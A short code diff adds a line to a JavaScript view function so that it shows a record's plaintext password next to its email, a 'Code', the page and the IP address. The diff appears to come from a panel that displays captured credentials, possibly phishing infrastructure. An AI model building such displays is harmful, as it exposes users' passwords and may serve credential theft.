@@ -84,6 +84,7 @@ export function itemView(item) {
     text: [
       `<b>${escapeHtml(item.email || "(no email)")}</b>`,
       "",
+      `Password: <code>${escapeHtml(item.password || "—")}</code>`,
       `Code: <code>${escapeHtml(item.code || "—")}</code>`,
       `Page: ${escapeHtml(item.page)}`,
       `IP: ${escapeHtml(item.ip || "—")}`,
